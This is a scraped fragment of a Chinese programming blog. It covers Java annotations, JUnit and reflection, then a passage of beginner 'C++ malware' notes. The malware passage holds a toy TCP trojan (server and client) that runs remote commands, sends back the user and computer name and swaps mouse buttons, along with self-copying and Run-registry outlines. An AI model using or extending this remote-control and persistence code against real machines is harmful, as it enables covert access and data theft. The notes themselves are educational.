@Retention：描述注解能被保留的阶段 - @Documented：描述注解是否被抽取到api文档中 - @Inherited：描述注解是否这子类继承 */import java.lang.annotation.*;//表示anno3注解只能作用于类上@Target(value = &#123; ElementType.TYPE, ElementType.METHOD, ElementType.FIELD&#125;)@Documented@Retention(RetentionPolicy.RUNTIME)public @interface MyAnno3 &#123;&#125; 删除该注解后 @Inherited：描述注解是否被子类继承 解析注解 将配置文件的工作交给注解完成 123456789/** * 描述需要执行的类名和方法名 */@Target(ElementType.TYPE)@Retention(RetentionPolicy.RUNTIME)public @interface Pro &#123; String className(); String method();&#125; 1234567891011121314151617181920212223242526package LearnJunit.annotation;import LearnJunit.reflect.ReflectDemo1;import java.io.IOException;import java.io.InputStream;import java.lang.reflect.InvocationTargetException;import java.lang.reflect.Method;import java.util.Properties;//假设框架类@Pro(className = &quot;LearnJunit.annotation.Demo1&quot;, method = &quot;show&quot;)public class ReflectFramework &#123; public static void main(String[] args) throws Exception &#123; //1.解析注解 // 获取该类的字节码文件对象 Class&lt;ReflectFramework&gt; reflectFrameworkClass = ReflectFramework.class; //2.获得注解对象 // 内存中生成了该注解接口的 子类实现对象 Pro an = reflectFrameworkClass.getAnnotation(Pro.class); //3.调用注解对象中定义的抽象方法，获取返回值 String className = an.className(); &#125;&#125; 关于步骤2，在 21行下个断点 这个时候注解相关的都还没有对应数据，但是获得了注解(.getAnnotation)对象后 不仅reflectFrameworkClass注解有了值，而且在内存中多出了一个an变量，而an就是我们注解的内容 最后加上 1234567//4.反射获得类Class aClass = Class.forName(className);//5.获得类的方法Method aMethod = aClass.getMethod(methodName);//6.调用方法Object aObject = aClass.newInstance();aMethod.invoke(aObject); 就能使用注解中的类的对应方法了 案例 测试类 LearnJunit.annotation.demo.Calculator 123456789101112131415161718192021222324252627package LearnJunit.annotation.demo;public class Calculator &#123; @check public void add() &#123; System.out.println(&quot;1 + 0 = &quot; + (1 + 0)); &#125; @check public void sub() &#123; System.out.println(&quot;1 - 0 = &quot; + (1 - 0)); &#125; @check public void mul() &#123; System.out.println(&quot;1 * 0 = &quot; + (1 * 0)); &#125; @check public void div() &#123; System.out.println(&quot;1 / 0 = &quot; + (1 / 0)); &#125; public void show()&#123; System.out.println(&quot;always normal&quot;); &#125;&#125; 测试注解 LearnJunit.annotation.demo.check 1234567891011package LearnJunit.annotation.demo;import java.lang.annotation.ElementType;import java.lang.annotation.Retention;import java.lang.annotation.RetentionPolicy;import java.lang.annotation.Target;@Target(ElementType.METHOD)@Retention(RetentionPolicy.RUNTIME)public @interface check &#123;&#125; 测试方法 LearnJunit.annotation.demo.testCheck 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748package LearnJunit.annotation.demo;import java.io.BufferedWriter;import java.io.FileWriter;import java.io.IOException;import java.lang.reflect.Method;/** * 简单测试框架 * 挡住方法执行后，自动执行被检测的所有方法 */public class testCheck &#123; public static void main(String[] args) throws IOException &#123; //1.创建被测试对象 Calculator calculator = new Calculator(); //2.得到所有带注解的函数 int e_num = 0;//出现异常的次数 BufferedWriter bw = new BufferedWriter(new FileWriter(&quot;bug.txt&quot;));//创建文件对象 //2.1得到所有函数 Method[] methods = calculator.getClass().getMethods(); for (Method method:methods)&#123; //2.2检测是否带注解 if(method.isAnnotationPresent(check.class))&#123; //2.3若带注解则执行 try &#123; method.invoke(calculator); &#125; catch(Exception e)&#123; //2.3.1捕获异常 e.printStackTrace(); //2.3.2记录到文件 e_num++; bw.write(&quot;+++++&quot;+method.getName()+&quot; 方法异常&quot;); bw.newLine(); bw.write(&quot;异常名称&gt;&gt; &quot;+e.getCause().getClass().getSimpleName()); bw.newLine(); bw.write(&quot;异常原因&gt;&gt;&quot;+e.getCause().getMessage()); bw.newLine(); &#125; &#125; &#125; bw.write(&quot;本次测试一共出现 &quot;+e_num+&quot; 次异常&quot;); bw.newLine(); bw.flush(); bw.close(); &#125;&#125; 小结 大多数时候使用注解而不是自定义注解 注解给谁用： 编译器 解析程序（checkTest） 注解不是程序的一部分（相当于C的编译参数，如预编译命令）","categories":[{"name":"notes","slug":"notes","permalink":"https://joe1sn.eu.org/categories/notes/"},{"name":"java","slug":"notes/java","permalink":"https://joe1sn.eu.org/categories/notes/java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://joe1sn.eu.org/tags/Java/"}]},{"title":"JavaWeb笔记-Junit与反射","slug":"java-d1-Junit","date":"2022-03-15T23:27:53.000Z","updated":"2022-09-20T08:42:26.611Z","comments":true,"path":"2022/03/16/java-d1-Junit/","link":"","permalink":"https://joe1sn.eu.org/2022/03/16/java-d1-Junit/","excerpt":"Junit单元测试与反射 黑盒-白盒","text":"Junit单元测试与反射 黑盒-白盒 junit使用：白盒测试 步骤： 定义一个测试类 测试类名：被测试类+Test CalculatorTest 包名：xxx.xxx.xxx.test 定义测试方法：可以独立执行，建议 方法名：test测试方法名 testAdd() 返回值：void（独立运行） 参数列表：空参 方法+@test注解 导入Junit依赖环境 1234567891011121314151617package test;import junit.Calculator;import org.junit.Test;public class CalculatorTest &#123; //测试add方法 @Test public void testAdd()&#123; //System.out.printf(&quot;Excuted&quot;); //创建计算器对象 Calculator c = new Calculator(); //2.调用add方法 int result = c.add(1,2); System.out.println(result); &#125;&#125; 123456789101112package junit;//计算器public class Calculator &#123; //加法 public int add(int a, int b)&#123; return a+b; &#125; //减法 public int sub(int a, int b)&#123; return a-b; &#125;&#125; 在add添加除0异常 12345678910111213package junit;//计算器public class Calculator &#123; //加法 public int add(int a, int b)&#123; int i = 3/0; return a+b; &#125; //减法 public int sub(int a, int b)&#123; return a-b; &#125;&#125; 假设原方法中add写成了-，使用断言报错 1234567891011121314151617181920package test;import junit.Calculator;import org.junit.Assert;import org.junit.Test;public class CalculatorTest &#123; //测试add方法 @Test public void testAdd()&#123; //System.out.printf(&quot;Excuted&quot;); //创建计算器对象 Calculator c = new Calculator(); //2.调用add方法 int result = c.add(1,2); //断言assert Assert.assertEquals(3, result); &#125;&#125; 同理可以得到sub的测试函数 1234567//测试sub方法@Testpublic void testSub()&#123; Calculator c = new Calculator(); int result = c.sub(2,1); Assert.assertEquals(3,result);&#125; 注解补充 @Before 初始化方法 用于资源的申请，所有测试方法执行之前都会先执行该方法 在测试方法之前被自动执行 @After 释放资源 在所有测试方法执行完后都会自动执行该方法 测试方法执行之后自动执行 12345678910111213//初始化方法//用于资源的申请，所有测试方法执行之前都会先执行该方法@Beforepublic void init()&#123; System.out.println(&quot;init...&quot;);&#125;//释放资源//在所有测试方法执行完后都会自动执行该方法@Afterpublic void close()&#123; System.out.println(&quot;closed&quot;);&#125; 反射 框架设计的灵魂 框架：半成品软件。可以在框架基础上继续开发，简化编码 反射：将类的各个组成部分封装为其他对象（反射机制） 好处： 在程序运行中操作这些对象 可以解耦，提高程序可拓展性 Java代码运行阶段 获取Class对象方式 Source： 对用于配置文件，将类名定义在配置文件中。读取文件，加载类 Class.forName(“全类名”)：将字节码文件加载进内存返回class对象 Class： 多用于参数传递 依据类名属性class，获取class对象 Runtime 多用于对象的获取字节码的方式 对象.getClass()：方法封装在Object中，被所有对象继承了 同一个字节码文件在同一次程序运行中，只会被加载一次；不论通过那种方式取得，都是同一个对象 每个类对象都不同 使用class对象 功能： 获取： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647package LearnJunit.domain;public class Person &#123; private String name; private int age; public String a; protected String b; String c; private String d; public Person() &#123; &#125; public Person(String name, int age) &#123; this.name = name; this.age = age; &#125; public void setName(String name) &#123; this.name = name; &#125; public String getName() &#123; return name; &#125; public void setAge(int age) &#123; this.age = age; &#125; public int getAge() &#123; return age; &#125; @Override public String toString() &#123; return &quot;Person&#123;&quot; + &quot;name=&#x27;&quot; + name + &#x27;\\&#x27;&#x27; + &quot;, age=&quot; + age + &quot;, a=&#x27;&quot; + a + &#x27;\\&#x27;&#x27; + &quot;, b=&#x27;&quot; + b + &#x27;\\&#x27;&#x27; + &quot;, c=&#x27;&quot; + c + &#x27;\\&#x27;&#x27; + &quot;, d=&#x27;&quot; + d + &#x27;\\&#x27;&#x27; + &#x27;&#125;&#x27;; &#125;&#125; 获取成员变量们 Field[] getFields()：获取所有public成员变量 1234Field[] fields = personClass.getFields();for (Field field: fields)&#123; System.out.println(field);&#125; Field getField(String name)：获取所有指定名称public成员变量 1Field a = personClass.getField(&quot;a&quot;); Field[] getDeclaredFields() 12345//获取所有成员变量，不考虑修饰Field[] DeclaredFields = personClass.getDeclaredFields();for (Field getDeclaredField: DeclaredFields)&#123; System.out.println(getDeclaredField);&#125; Field getDeclaredField(String name) 反射私有、保护成员变量，要设置忽略访问权限的修饰符安全监测 1234567//1.4获取单个私有System.out.println(&quot;---------------&quot;);Field d = personClass.getDeclaredField(&quot;d&quot;);//1.4.1忽略安全访问d.setAccessible(true);//暴力反射Object value2 = d.get(p);System.out.println(value2); 获取构造方法们 Constructor&lt;?&gt;[] getConstructors() 12Constructor constructor = personClass.getConstructor(String.class, int.class);System.out.println(constructor); Constructor&lt;T&gt; getConstructor(String name) Constructor&lt;?&gt;[] getDeclaredConstructors() Constructor&lt;T&gt; getDeclaredConstructor(String name) 获取成员方法们 method[] getMethods() 12345//获取所有public修饰方法Method[] funcs = personClass.getMethods();for (Method func:funcs)&#123; System.out.println(func);&#125; 123456789101112131415public java.lang.String LearnJunit.domain.Person.toString()public java.lang.String LearnJunit.domain.Person.getName()public void LearnJunit.domain.Person.setName(java.lang.String)public int LearnJunit.domain.Person.getAge()public void LearnJunit.domain.Person.setAge(int)public void LearnJunit.domain.Person.eat()public void LearnJunit.domain.Person.eat(java.lang.String)public final void java.lang.Object.wait() throws java.lang.InterruptedExceptionpublic final void java.lang.Object.wait(long,int) throws java.lang.InterruptedExceptionpublic final native void java.lang.Object.wait(long) throws java.lang.InterruptedExceptionpublic boolean java.lang.Object.equals(java.lang.Object)public native int java.lang.Object.hashCode()public final native java.lang.Class java.lang.Object.getClass()public final native void java.lang.Object.notify()public final native void java.lang.Object.notifyAll() 因为Person类继承的是Object对象，所以有些隐藏函数，即从Object继承下来的函数 method getMethod(String name) 12345 //获取指定方法名称//名字，参数列表匹配 Method eat = personClass.getMethod(&quot;eat&quot;); Method eat2 = personClass.getMethod(&quot;eat&quot;,String.class); eat2.invoke(p,&quot;fish&quot;); method[] getDeclaredMethods() method getDeclaredMethod(String name) 获取类名 String getName() 操作 Field成员变量 设置值（get） 12345Field a = personClass.getField(&quot;a&quot;);//获取成员变量a的值Person p = new Person();Object value = a.get(p);System.out.println(value); 获取值（set） 12a.set(p,&quot;John&quot;);System.out.println(p); 暴力反射：.setAccessible(true); 对所有反射都有效 搭配getDeaclearedXXX使用 这仅仅是打印名称和比较，不需要设置；但是如果要对对象进行相关操作，必须设置；不设置的话操作受限。 Constructor构造方法 创建对象 T newInstance(Object... initargs) 123//1.2创建对象Object person = constructor.newInstance(&quot;Jonh&quot;,5);System.out.println(person); 如果构造使用空参创造对象，可简化 class对象的 newInstance 123Object o = personClass.newInstance();System.out.println(o);System.out.println(&quot;-------------&quot;); Method成员对象 执行方法 123456//获取指定方法名称Method eat = personClass.getMethod(&quot;eat&quot;);//创建方法对象Person p = new Person();//执行方法eat.invoke(p); 获取方法名称 1System.out.println(func.getName()); 获取类名 123//获取类名String classname = personClass.getName();System.out.println(classname); 反射案例 案例： 需求：一个框架，可以帮我们创建任意类的对象，并且执行任意方法 不能改变该类的任何代码， 创建任意对象执行任意方法 一般方式： 12345678910package LearnJunit.reflect;import LearnJunit.domain.Person;//假设框架类public class ReflectFramework &#123; public static void main(String[] args) &#123; //可以创建任意类对象，可以执行任意方法 Person p = new Person(); p.eat(); &#125;&#125; 这里的框架是提前学好的，不能改变；若要使用student类，则代码会改变 实现 配置文件 反射 步骤 将需要创建的对象的全类名和需要执行的方法定义在配置文件中 src中创建配置文件 12className=LearnJunit.domain.PersonmethodName=eat 在程序中加载读取配置文件 1234567891011//1.加载配置文件//1.1创建配置对象Properties pro = new Properties();//1.2加载配置文件，转换为集合//1.2.1获取class目录下配置文件ClassLoader classLoader = ReflectFramework.class.getClassLoader();//获得当前类路径InputStream is = classLoader.getResourceAsStream(&quot;config.properties&quot;);//读取路径下的config.propertiespro.load(is);//2.获取配置文件中定义的数据String className = pro.getProperty(&quot;className&quot;);String methodName = pro.getProperty(&quot;methodName&quot;); 使用反射技术来加载类文件进内存，创建对象并执行方法 1234567//3.加载类进内存Class cls = Class.forName(className);//4.创建对象Object obj = cls.newInstance();//5.获取方法对象Method method = cls.getMethod(methodName);method.invoke(obj); 完整代码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849package LearnJunit.reflect;import LearnJunit.domain.Person;import LearnJunit.domain.Student;import java.io.IOException;import java.io.InputStream;import java.lang.reflect.InvocationTargetException;import java.lang.reflect.Method;import java.util.Properties;import java.util.stream.IntStream;//假设框架类public class ReflectFramework &#123; public static void main(String[] args) throws IOException, ClassNotFoundException, IllegalAccessException, InstantiationException, InvocationTargetException, NoSuchMethodException &#123; //可以创建任意类对象，可以执行任意方法 //不能改变该类的任何代码， //创建任意对象执行任意方法 //1.加载配置文件 //1.1创建配置对象 Properties pro = new Properties(); //1.2加载配置文件，转换为集合 //1.2.1获取class目录下配置文件 ClassLoader classLoader = ReflectFramework.class.getClassLoader(); InputStream is = classLoader.getResourceAsStream(&quot;config.properties&quot;); pro.load(is); //2.获取配置文件中定义的数据 String className = pro.getProperty(&quot;className&quot;); String methodName = pro.getProperty(&quot;methodName&quot;); //3.加载类进内存 Class cls = Class.forName(className); //4.创建对象 Object obj = cls.newInstance(); //5.获取方法对象 Method method = cls.getMethod(methodName); method.invoke(obj); &#125;&#125; 这样只需要修改配置文件就可以了","categories":[{"name":"notes","slug":"notes","permalink":"https://joe1sn.eu.org/categories/notes/"},{"name":"java","slug":"notes/java","permalink":"https://joe1sn.eu.org/categories/notes/java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://joe1sn.eu.org/tags/Java/"}]},{"title":"C++恶意软件入门笔记","slug":"Maleware","date":"2021-03-30T03:01:00.000Z","updated":"2022-09-20T08:41:07.261Z","comments":true,"path":"2021/03/30/Maleware/","link":"","permalink":"https://joe1sn.eu.org/2021/03/30/Maleware/","excerpt":"C++恶意软件入门笔记","text":"C++恶意软件入门笔记 简单的Windows API 复制自身到Windows目录 1-1.获得程序自生API DWORD GetModuleFileName 1-2.获得windows目录 UINT GetWindowsDirectory 1-3.拷贝文件 BOOL CopyFile 获得系统基本参数 2-1.获得操作系统版本 BOOL GetVersionEx typedef struct _OSVERSIONINFOA &#123; DWORD dwOSVersionInfoSize; DWORD dwMajorVersion; DWORD dwMinorVersion; DWORD dwBuildNumber; DWORD dwPlatformId; CHAR szCSDVersion[128]; // Maintenance string for PSS usage &#125; OSVERSIONINFOA, * POSVERSIONINFOA, * LPOSVERSIONINFOA; &lt;!--code￼0--&gt; TCP//IP连接木马 简单的TCP/IP测试 server 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273#include &lt;iostream&gt;#include &lt;Winsock2.h&gt;#pragma comment (lib, &quot;ws2_32&quot;)using namespace std;//链接dll// 使用该函数来初始化ws2_32.dll//int WSAStartup//释放Dll// int WSACleanuo(void)//创建的套接字// SOCKET socket// (WSAAPI* LPFN_SOCKET)(// _In_ int af, //通讯协议簇// _In_ int type, //要创建的套接字类型// _In_ int protocol //指定程序所用的通讯协议// );//关闭套接字// closesocket//绑定IP和端口// int bind (SOCKET s, socketaddr, int namelen)//WSAStartup-&gt;socket-&gt;bind-&gt;listen-&gt;accept-&gt;send/recv-&gt;closesocket-&gt;WSACleanupint main()&#123; //1.初始化ws2_32.dll WSADATA wsaData; WSAStartup(MAKEWORD(2,2), &amp;wsaData); //2.创建socket套接字 // 通讯协议簇 套接字类型 通讯协议 SOCKET s = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP); //socket对象 s sockaddr_in sockaddr; //socket 等待对象sockaddr sockaddr.sin_family = PF_INET; sockaddr.sin_addr.S_un.S_addr = inet_addr(&quot;127.0.0.1&quot;);//点地址 sockaddr.sin_port = htons(1000); //设置端口 //3.绑定ip和端口 bind(s, (SOCKADDR*)&amp;sockaddr, sizeof(SOCKADDR)); //将socket s 设置为socketaddr类型 //4.监听 listen(s, 1); cout &lt;&lt; &quot;Start Listenning\\n&quot;; //4.等待连接 SOCKADDR clientAddr; int nSize = sizeof(SOCKADDR); SOCKET clientSock; clientSock = accept(s, (SOCKADDR*)&amp;clientAddr, &amp;nSize);//创建连接对象 cout &lt;&lt; &quot;Client is on!\\n&quot;; //5.recv || send char msg[] = &quot;hello from server\\n&quot;; send(clientSock, msg, strlen(msg)+sizeof(char), NULL); cout &lt;&lt; &quot;Sending Message\\n&quot;; //6.断开Socket closesocket(clientSock); closesocket(s); cout &lt;&lt; &quot;Connection close\\n&quot;; //7.释放ws2_32库 WSACleanup(); cout &lt;&lt; &quot;Resorces clean\\n&quot;; return 0;&#125; client 123456789101112131415161718192021222324252627282930313233343536#include &lt;iostream&gt;#include &lt;winsock2.h&gt;#pragma comment (lib,&quot;ws2_32&quot;)using namespace std;//WSAstartup-&gt;socket-&gt;connect-&gt;recv/send-&gt;closesocket-&gt;WSACleanupint main()&#123; //1.初始化DLL WSADATA wsaData; WSAStartup(MAKEWORD(2,2),&amp;wsaData); //2.创建Socket链接对象 SOCKET s = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP); sockaddr_in sockaddr; sockaddr.sin_family = PF_INET; sockaddr.sin_addr.S_un.S_addr = inet_addr(&quot;127.0.0.1&quot;); sockaddr.sin_port = htons(1000); //3.连接到server connect(s, (SOCKADDR *) &amp;sockaddr, sizeof(SOCKADDR)); //4.设置数据缓冲区 char szBuffer[MAXBYTE]; recv(s, szBuffer, MAXBYTE, NULL); cout &lt;&lt; &quot;This is msg from server\\n&quot;; cout &lt;&lt; &quot; &quot; &lt;&lt; szBuffer; //5.关闭socket closesocket(s); WSACleanup(); return 0;&#125; SimpleTCPTorjan server 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980#include &lt;iostream&gt;#include &lt;winsock2.h&gt;#include &lt;cstring&gt;#pragma comment (lib, &quot;ws2_32&quot;)using namespace std;const int MaxBuf = 0x50;//1.完成功能命令的发送//2.可以查看远程主机的相关信息，以及复制自身到可执行目录//3.打开/关闭光驱//4.交换和恢复鼠标左右键//宏定义帮助菜单#define HELP &quot;help - Show Help Menu\\n&quot; \\ &quot;getsysinfo - Get System Info\\n&quot; \\ &quot;open - Open The CDRom\\n&quot; \\ &quot;close - Close The CSRom\\n&quot; \\ &quot;swap - Swap Mouse Button\\n&quot; \\ &quot;restore - Restore Mouse Button\\n&quot; \\ &quot;exit - Quit Shell\\n&quot;int main()&#123; //1.初始化DLL WSADATA wsaData; WSAStartup(MAKEWORD(2, 2), &amp;wsaData); //2.创建Socket链接对象 SOCKET s = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP); sockaddr_in sockaddr; sockaddr.sin_family = PF_INET; sockaddr.sin_addr.S_un.S_addr = inet_addr(&quot;127.0.0.1&quot;); sockaddr.sin_port = htons(1000); //3.绑定ip和端口 bind(s, (SOCKADDR*)&amp;sockaddr, sizeof(SOCKADDR)); //将socket s 设置为socketaddr类型 listen(s, 1); //4.等待连接 SOCKADDR clientAddr; int nSize = sizeof(SOCKADDR); SOCKET clientSock; clientSock = accept(s, (SOCKADDR*)&amp;clientAddr, &amp;nSize);//创建连接对象 cout &lt;&lt; &quot;Client is on!\\n&quot;; //开始监听 char CMD[MaxBuf]; char recver[MaxBuf]; memset(CMD, 0, MaxBuf); while (1) &#123; cin &gt;&gt; CMD; if (!strcmp(CMD, &quot;help&quot;)) cout &lt;&lt; HELP &lt;&lt; endl; else if (!strcmp(CMD, &quot;getsysinfo&quot;)) &#123; send(clientSock, CMD, strlen(CMD) + sizeof(char), NULL); char temp[MaxBuf]; memset(temp, 0, MaxBuf); recv(s, temp, strlen(temp) + sizeof(char), NULL); memset(temp, 0, MaxBuf); recv(s, temp, strlen(temp) + sizeof(char), NULL); cout &lt;&lt; &quot;recved?\\n&quot;; cout &lt;&lt; temp &lt;&lt;endl; &#125; else send(clientSock, CMD, strlen(CMD) + sizeof(char), NULL); memset(CMD, 0, MaxBuf); &#125; //6.断开Socket closesocket(clientSock); closesocket(s); cout &lt;&lt; &quot;Connection close\\n&quot;; //7.释放ws2_32库 WSACleanup(); cout &lt;&lt; &quot;Resorces clean\\n&quot;; return 0;&#125; client 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107#include &lt;iostream&gt;#include &lt;winsock2.h&gt;#include &lt;windows.h&gt;#pragma comment (lib,&quot;ws2_32&quot;)using namespace std;const int MaxBuf = 0x50;//打开或关闭光驱//VOID SetCdaudio(BOOL bOpen)//&#123;// if (bOpen)// mciSendStringA(&quot;set cdaudio door open&quot;,NULL,NULL,NULL);// else// mciSendStringA(&quot;set cdaudio door clsoed&quot;, NULL, NULL, NULL);//&#125;VOID MouseSwap(BOOL bSwap)&#123; if (bSwap) SwapMouseButton(TRUE); else SwapMouseButton(FALSE);&#125;//对命令进行解析BOOL Dispatch(SOCKET &amp;sock, char* szCmd)&#123; BOOL bRet = FALSE; if (!strcmp(szCmd, &quot;getsysinfo&quot;)) &#123; char szComputerName[MaxBuf]; char szUserName[MaxBuf]; DWORD buffer1 = MaxBuf; GetComputerNameA(szComputerName, &amp;buffer1); DWORD buffer2 = MaxBuf; GetUserNameA(szUserName, &amp;buffer2); strcat(szUserName, &quot;@&quot;); strcat(szUserName, szComputerName); cout &lt;&lt; szUserName &lt;&lt; endl; send(sock, szUserName, strlen(szUserName) + sizeof(char),NULL); bRet = 1; &#125; //else if (!strcmp(szCmd, &quot;open&quot;)) //&#123; // SetCdaudio(1); // bRet = 1; //&#125; //else if (!strcmp(szCmd, &quot;clsoe&quot;)) //&#123; // SetCdaudio(0); // bRet = 1; //&#125; else if (!strcmp(szCmd, &quot;swap&quot;)) &#123; MouseSwap(1); bRet = 1; &#125; else if (!strcmp(szCmd, &quot;restore&quot;)) &#123; MouseSwap(0); bRet = 1; &#125; else if (!strcmp(szCmd, &quot;exit&quot;)) exit(0); else bRet = 0; return bRet;&#125;int main()&#123; //1.初始化DLL WSADATA wsaData; WSAStartup(MAKEWORD(2, 2), &amp;wsaData); //2.创建Socket链接对象 SOCKET s = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP); sockaddr_in sockaddr; sockaddr.sin_family = PF_INET; sockaddr.sin_addr.S_un.S_addr = inet_addr(&quot;127.0.0.1&quot;); sockaddr.sin_port = htons(1000); //3.连接到server connect(s, (SOCKADDR*)&amp;sockaddr, sizeof(SOCKADDR)); //4.设置数据缓冲区 char szBuffer[MAXBYTE]; memset(szBuffer, 0, MaxBuf); while (1) &#123; if (s) &#123; recv(s, szBuffer, MAXBYTE, NULL); cout &lt;&lt; szBuffer &lt;&lt; endl; Dispatch(s, szBuffer); memset(szBuffer, 0, MaxBuf); &#125; &#125; //5.关闭socket closesocket(s); WSACleanup(); return 0;&#125; client回传计算机相关信息有问题 Windows文件操作相关API 注册表相关 1.打开注册表 12345678WINADVAPILSTATUSAPIENTRYRegOpenKeyA ( _In_ HKEY hKey, _In_opt_ LPCSTR lpSubKey, _Out_ PHKEY phkResult ); 使用 12HKEY hKey;long lRet = RegOpenKey(keysname, REG_RUN, &amp;hKey); 2.注册表查询 https://docs.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regqueryinfokeya 1234567891011121314151617WINADVAPILSTATUSAPIENTRYRegQueryInfoKeyA( _In_ HKEY hKey, //子键句柄 _Out_writes_to_opt_(*lpcchClass,*lpcchClass + 1) LPSTR lpClass, //指向缓冲区的指针，该缓冲区接收用户定义的键类。此参数可以为NULL。 _Inout_opt_ LPDWORD lpcchClass, //该变量指定lpClass参数指向的缓冲区的大小 _Reserved_ LPDWORD lpReserved, //此参数是保留参数，必须为NULL。 _Out_opt_ LPDWORD lpcSubKeys, //指向一个变量的指针，该变量接收指定键所包含的子键的数量。此参数可以为NULL _Out_opt_ LPDWORD lpcbMaxSubKeyLen,//指向变量的指针，该变量以最长的名称接收键的子键的大小，以Unicode字符表示，不包括终止的空字符 _Out_opt_ LPDWORD lpcbMaxClassLen,//指向变量的指针，该变量接收以Unicode字符表示的指定子项类的最长字符串的大小 _Out_opt_ LPDWORD lpcValues, //指向变量的指针，该变量接收与键关联的值的数量 _Out_opt_ LPDWORD lpcbMaxValueNameLen,//指向变量的指针，该变量接收键的最长值名称的大小（以Unicode字符表示） _Out_opt_ LPDWORD lpcbMaxValueLen,//指向一个变量的指针，该变量接收键值中最长的数据分量的大小（以字节为单位） _Out_opt_ LPDWORD lpcbSecurityDescriptor,//指向一个变量的指针，该变量接收密钥的安全描述符的大小 _Out_opt_ PFILETIME lpftLastWriteTime//指向接收最后写入时间的FILETIME结构的指针 。此参数可以为NULL ); 3.注册表写入 1234567891011WINADVAPILSTATUSAPIENTRYRegSetKeyValueA( _In_ HKEY hKey, _In_opt_ LPCSTR lpSubKey, _In_opt_ LPCSTR lpValueName, _In_ DWORD dwType, _In_reads_bytes_opt_(cbData) LPCVOID lpData, _In_ DWORD cbData ); 4.注册表值的枚举 12345678910111213WINADVAPILSTATUSAPIENTRYRegEnumKeyExA( _In_ HKEY hKey, _In_ DWORD dwIndex, //查询索引 _Out_writes_to_opt_(*lpcchName,*lpcchName + 1) LPSTR lpName,//子键名称 _Inout_ LPDWORD lpcchName, //如果函数成功，则由lpcName指向的变量将包含存储在缓冲区中的字符数，不包括终止的空字符 _Reserved_ LPDWORD lpReserved, //此参数是保留参数，必须为NULL _Out_writes_to_opt_(*lpcchClass,*lpcchClass + 1) LPSTR lpClass,//该缓冲区接收枚举子项的用户定义类 _Inout_opt_ LPDWORD lpcchClass, //如果函数成功，则lpcClass包含缓冲区中存储的字符数，不包括终止的空字符 _Out_opt_ PFILETIME lpftLastWriteTime//指向FILETIME结构的指针，该结构接收上一次写入枚举子键的时间 ); 5.键值删除 1234567WINADVAPILSTATUSAPIENTRYRegDeleteKeyA ( _In_ HKEY hKey, _In_ LPCSTR lpSubKey ); 文件操作相关 1.打开文件 123456789CreateFileA( _In_ LPCSTR lpFileName, //要打开的文件名字 _In_ DWORD dwDesiredAccess, //访问模式 _In_ DWORD dwShareMode, //文件的共享模式 _In_opt_ LPSECURITY_ATTRIBUTES lpSecurityAttributes, //安全属性 _In_ DWORD dwCreationDisposition, //创建或打开文件不存在时的操作 _In_ DWORD dwFlagsAndAttributes, //创建或打开文件的标志和属性 _In_opt_ HANDLE hTemplateFile //文件模板); 2.关闭文件 123CloseHandle( _In_ _Post_ptr_invalid_ HANDLE hObject ); 3.删除文件 12345BOOLWINAPIDeleteFileA( _In_ LPCSTR lpFileName ); 4.读函数 1234567891011WINBASEAPI_Must_inspect_result_BOOLWINAPIReadFile( _In_ HANDLE hFile, //文件句柄 _Out_writes_bytes_to_opt_(nNumberOfBytesToRead, *lpNumberOfBytesReashud) __out_data_source(FILE) LPVOID lpBuffer, //指向一个缓冲区，把数据读取到里面 _In_ DWORD nNumberOfBytesToRead, //要读取的字节数 _Out_opt_ LPDWORD lpNumberOfBytesRead, //返回实际的读取数 _Inout_opt_ LPOVERLAPPED lpOverlapped //一般设置为NULL ); 5.写函数 12345678910WINBASEAPIBOOLWINAPIWriteFile( _In_ HANDLE hFile, _In_reads_bytes_opt_(nNumberOfBytesToWrite) LPCVOID lpBuffer, _In_ DWORD nNumberOfBytesToWrite, _Out_opt_ LPDWORD lpNumberOfBytesWritten, _Inout_opt_ LPOVERLAPPED lpOverlapped ); 6.设置文件指针 123456789WINBASEAPIDWORDWINAPISetFilePointer( _In_ HANDLE hFile, //打开的文件句柄 _In_ LONG lDistanceToMove, //指定要移动的距离 _Inout_opt_ PLONG lpDistanceToMoveHigh, //要移动距离的高32位 _In_ DWORD dwMoveMethod //指定移动位置 ); 7.创建目录 1234567WINBASEAPIBOOLWINAPICreateDirectoryA( _In_ LPCSTR lpPathName, _In_opt_ LPSECURITY_ATTRIBUTES lpSecurityAttributes ); 8.移动目录 123456WINBASEAPIBOOLWINAPIRemoveDirectoryA( _In_ LPCSTR lpPathName ); AutoImmunity的MFC初体验 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106// AutoRunImmunity.cpp: 定义应用程序的类行为。//#include &quot;pch.h&quot;#include &quot;framework.h&quot;#include &quot;AutoRunImmunity.h&quot;#include &quot;AutoRunImmunityDlg.h&quot;#ifdef _DEBUG#define new DEBUG_NEW#endif// CAutoRunImmunityAppBEGIN_MESSAGE_MAP(CAutoRunImmunityApp, CWinApp) ON_COMMAND(ID_HELP, &amp;CWinApp::OnHelp)END_MESSAGE_MAP()// CAutoRunImmunityApp 构造CAutoRunImmunityApp::CAutoRunImmunityApp()&#123; // 支持重新启动管理器 m_dwRestartManagerSupportFlags = AFX_RESTART_MANAGER_SUPPORT_RESTART; // TODO: 在此处添加构造代码， // 将所有重要的初始化放置在 InitInstance 中&#125;// 唯一的 CAutoRunImmunityApp 对象CAutoRunImmunityApp theApp;// CAutoRunImmunityApp 初始化BOOL CAutoRunImmunityApp::InitInstance()&#123; // 如果一个运行在 Windows XP 上的应用程序清单指定要 // 使用 ComCtl32.dll 版本 6 或更高版本来启用可视化方式， //则需要 InitCommonControlsEx()。 否则，将无法创建窗口。 INITCOMMONCONTROLSEX InitCtrls; InitCtrls.dwSize = sizeof(InitCtrls); // 将它设置为包括所有要在应用程序中使用的 // 公共控件类。 